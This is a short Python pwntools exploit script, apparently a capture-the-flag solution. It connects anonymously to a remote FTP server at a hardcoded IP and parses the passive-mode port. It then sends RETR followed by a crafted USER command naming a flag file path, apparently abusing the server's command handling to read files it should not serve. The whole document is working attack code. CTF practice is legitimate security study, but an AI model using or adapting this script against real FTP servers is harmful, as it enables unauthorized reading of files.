from pwn import *
context.log_level="debug"
p = remote("47.89.253.219",2121)
def se(cmd):
    p.send(f"{cmd}\r\n".encode())
def rl():
    return p.recvuntil(b"\n")
def ru(delim):
    return p.recvuntil(delim)
def pasv():
    se("PASV")
    port_resp = rl()[len("227 Entering Passive Mode (0,0,0,0,"):].decode()
    port1 = int(port_resp[:port_resp.find(",")])
    port2 = int(port_resp[port_resp.find(",")+1:port_resp.find(")")])
    port = (port1<<8)+port2
    return port


rl()
se("USER anonymous")
rl()
se("PASS ttt")
rl()

pasv_port = pasv()
print(pasv_port)
# se("LIST")
# se("USER /")
# rl()
# rl()
# # nc port here to get the result
# input()
se("RETR hello.txt")
se("USER /flag.deb10154-8cb2-11ed-be49-0242ac110002")
rl()
rl()
input()